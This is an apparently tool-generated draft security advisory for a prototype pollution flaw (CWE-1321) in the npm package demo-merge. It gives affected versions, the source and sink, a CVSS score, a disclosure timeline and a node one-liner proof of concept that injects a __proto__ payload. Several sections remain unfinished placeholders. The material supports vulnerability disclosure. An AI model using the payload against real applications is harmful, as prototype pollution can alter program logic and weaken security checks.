# demo-merge: Prototype Pollution in mergeDeep()

## Summary
[DRAFT: One paragraph: Prototype Pollution in demo-merge up to and including 2.4.1, classified as CWE-1321. Local reproducer confirmed Object.prototype mutation via __proto__ injection]

## Affected Versions
- Package: `npm:demo-merge`
- Tested version: `2.4.1`
- Affected range: `up to and including 2.4.1`
- Fixed version: `2.4.2`

## Technical Details

- Source: JSON.parse(req.body) passed to mergeDeep()
- Sink:   target[key] = value in mergeDeep() at src/merge.js:42
- Guard:  no blocklist for __proto__, constructor, prototype

Affected file: `src/merge.js`
Affected function: `mergeDeep()`

[DRAFT: Explain the root cause and why the guard is insufficient or absent.]

## Impact
[DRAFT: Attacker control, required auth (true), user interaction (false), scope (true), security consequences (C:Low I:Low A:None).]

CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N` — 6.4 Medium

## Proof of Concept

```
node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'));" \
  && node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}')); console.log({}.polluted);"
```
Expected output: prints 'yes' confirming Object.prototype mutation

## Remediation
[DRAFT: Specific fix — e.g. reject prototype-mutating keys, validate input range, add output encoding.]

## Disclosure Timeline

- 2026-04-20: vendor contacted
- response: acknowledged
- 2026-05-20: planned public disclosure

## References

- Repository: https://github.com/example/demo-merge
- CWE-1321: https://cwe.mitre.org/data/definitions/1321.html

Reproduction artifacts:
  - .omv/repro/demo-merge-pp/commands.sh
  - .omv/repro/demo-merge-pp/observed.txt

---
Rendered by omv render_template  |  evidence: 100/100  |  submission: 90/100  |  status: confirmed
